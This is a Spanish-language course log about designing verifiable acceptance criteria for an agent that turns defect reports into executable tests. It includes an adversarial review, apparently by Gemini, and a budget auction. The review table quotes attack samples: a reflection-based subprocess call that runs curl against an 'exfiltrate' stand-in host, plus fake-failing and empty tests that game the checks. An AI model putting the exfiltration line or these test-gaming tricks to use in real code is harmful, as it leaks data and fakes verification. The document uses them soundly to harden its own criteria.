# Bitácora — Semana 3

## R1 · Encargo elegido

**E-6 — Convertir informes de defecto en casos de prueba ejecutables.**

Se eligió porque el producto final tiene un veredicto binario natural: la prueba es descubierta y ejecutada por el runner, o no.
Además, permite separar con claridad especificación del defecto, artefacto generado y verificación automática.

## Nivel declarado

**T1 — Agente acotado.** La ruta puede enumerarse, existe una decisión genuinamente ambigua al traducir un informe de
defecto a fixture/aserción y la salida puede verificarse por código.

Medición que autoriza ascender a T2:
`intermediate_artifacts_with_independent_reader > 1 OR ledger.retry_cost_usd > ledger.intermediate_gate_cost_usd`.

## R2 · Cinco criterios iniciales y autoataque

Los cinco criterios se sometieron primero a autoataque. Los que fallaron fueron corregidos antes de la revisión externa.

| Criterio inicial | Verificación | Sabor | Autoataque | Corrección previa a R3 |
|---|---|---|---|---|
| AC-01 · Cada informe produce un test que falla en el estado defectuoso. | `validator:defect_reproduction_rate >= 1.0` | Validador con umbral | `assert False` siempre falla sin reproducir el defecto. | Exigir que la falla provenga de una aserción derivada del comportamiento esperado y no de una falla incondicional. |
| AC-02 · Cada archivo generado se ejecuta con el runner. | `test:generated_tests_collect_and_run` | Test nombrado | Un archivo vacío puede ser descubierto sin probar nada. | Exigir al menos un caso ejecutable asociado al identificador del informe. |
| AC-03 · No hay efectos externos. | `test:no_external_effects` | Test nombrado / restricción negativa | Una escritura temporal o llamada de red puede escapar a un control superficial. | Prohibir escrituras fuera del área autorizada y llamadas de red/efectos externos. |
| AC-04 · La corrida respeta coste y tiempo. | `ledger:cost_usd <= 0.50 AND wall_clock_s <= 300` | Ledger | Detenerse antes de terminar mantiene el presupuesto sin completar el trabajo. | Evaluar presupuesto sólo para corridas marcadas `complete`; una incompleta debe declararse y ser reanudable. |
| AC-05 · Cada aserción cita el fragmento fuente del informe. | `test:traceability_matches_source` | Test nombrado | Repetir la misma referencia satisface presencia sin trazabilidad real. | Exigir que el localizador exista y coincida con la evidencia usada por la aserción. |

## R3 · Revisión cruzada con agente externo

Se ejecutó una revisión adversarial independiente mediante Google Gemini y se conservó la evidencia íntegra.

- **Run:** `gha-35804447917-1`
- **Commit evaluado:** `d96fbedc22f124a88ace251d9a4dcb91be92ffab`
- **Modelo solicitado:** `gemini-3.8-flash`
- **Modelo efectivo:** `gemini-3.5-flash-lite`
- **Evidencia:** `audits/runs/gha-35804447917-1/`
- **Hash de la revisión:** `b825feff4ae473f7b0cf267c892a3a8bf701df8930f2a2f893148275027d92bc`

### Tabla 3.A · Defensa de mis criterios

| Criterio | Ataque recibido | Salida concreta engañosa | Respuesta | Versión final / decisión |
|---|---|---|---|---|
| AC-01 | Falla artificial que aparenta reproducción del defecto. | `def test_defect(): raise AssertionError("Mock expected behavior assertion failure")` | **Aceptado.** La verificación no dejaba explícito que debía ejecutarse la ruta objetivo antes de fallar. | Cada caso debe invocar la ruta objetivo y fallar sólo por una aserción que compare el resultado observado con el comportamiento esperado; `raise AssertionError` y `assert False` no cuentan. Se mantiene `validator:defect_reproduction_rate >= 1.0`. |
| AC-02 | Test nominal descubierto por el runner pero sin comprobación real. | `def test_DEF_ABST_001(): pass` | **Aceptado.** El ataque cumple descubrimiento e identificación sin verificar el defecto. | Se exige ejecutar la ruta objetivo y evaluar una aserción no trivial derivada del comportamiento esperado. Verificación: `test:generated_tests_collect_and_assert_expected_behavior`. |
| AC-03 | Efecto externo mediante llamada indirecta/reflexión. | `import subprocess; getattr(subprocess, 'run')(['curl', 'http://external-server/exfiltrate'])` | **Aceptado.** Una búsqueda superficial puede omitir una llamada indirecta. | Se cambia a verificación en ejecución aislada: red deshabilitada, procesos externos bloqueados y escritura restringida. Verificación: `test:no_external_effects_runtime`. |
| AC-04 | No hubo salida concreta de ataque; el revisor lo marcó `resists`. | — | **Resiste R3.** | Se conserva técnicamente sin cambios, pero luego no se compra en R4 por presupuesto. |
| AC-05 | El revisor lo marcó `broken` porque fue descartado en la subasta. | No hubo ataque concreto para AC-05. | **Objeción rechazada como ataque R3.** Usa una decisión posterior de R4 y no aporta la salida concreta exigida para un ataque. | Se mantiene la corrección del autoataque; luego se mueve a no-objetivos por la subasta. |

Los tres ataques válidos recibidos incluyen criterio literal, salida concreta y explicación técnica en
`audits/runs/gha-35804447917-1/review.json`.

### Ataques documentados para C3

La revisión externa produjo tres ataques ejecutables y al menos uno fuera del mazo. En esta modalidad se conservan como
evidencia adversarial dentro de la bitácora y del expediente `audits/`. No se presenta como revisión humana ni como trabajo
de otro estudiante.

## R4 · Subasta de alcance

Presupuesto total: **100 fichas**.

La revisión de AC-03 mostró que una comprobación de búsqueda simple de 10 fichas no era suficiente. Para cerrar el ataque
se necesita un **test de repositorio ejecutado en aislamiento**, por lo que AC-03 pasa a costar 25 fichas.

| Criterio | Mecanismo | Coste | Estado |
|---|---|---:|---|
| AC-01 | Validador nuevo | 40 | Comprado |
| AC-02 | Test nuevo de repositorio | 25 | Comprado |
| AC-03 | Test nuevo de repositorio en aislamiento | 25 | Comprado |
| AC-04 | Consulta al ledger | 15 | No comprado |
| AC-05 | Test nuevo de trazabilidad | 25 | No comprado |

**Total gastado: 90. Restan 10.**

AC-04 se mueve a no-objetivos:
“Queda fuera del alcance de esta versión garantizar un tope de USD 0,50 y 300 s por corrida; se reabre cuando el presupuesto
de verificación disponga de al menos 15 fichas o exista un verificador de ledger mantenido y aceptado para este encargo.”

AC-05 se mueve a no-objetivos:
“Queda fuera del alcance de esta versión garantizar trazabilidad exacta entre cada aserción generada y el fragmento fuente
del informe; se reabre cuando el presupuesto de verificación disponga de al menos 25 fichas para mantener
`test:traceability_matches_source`.”

El `work_order.json` final contiene únicamente los criterios comprados, tal como exige la ronda de subasta.

## Datos bloqueantes

Se revisaron las siete clases del apunte. Para una corrida real siguen siendo bloqueantes:

1. el runner/comando autoritativo del repositorio objetivo;
2. la autoridad de la fuente cuando el informe y el repositorio se contradicen.

El detalle y el coste de adivinar mal están en `blocking_questions.md`.

## R5 · Banco mínimo

Los tres casos obligatorios están en `evals/`:

- `caso_abstencion.jsonl`
- `caso_adversario.jsonl`
- `caso_agotamiento.jsonl`

Cada archivo contiene entrada, estado inicial y veredicto esperado.

## Estado final

Quedaron construidos y versionados: R1, R2, autoataque, revisión adversarial externa auditada, respuestas y reescrituras de
R3, subasta recalculada, R5, nivel, preguntas bloqueantes, schema local, validación local y CI.

La única salvedad metodológica es que la revisión cruzada fue realizada por un **agente externo**. Si el docente exige de
forma literal otro estudiante humano, esa condición administrativa no puede demostrarse mediante esta automatización.
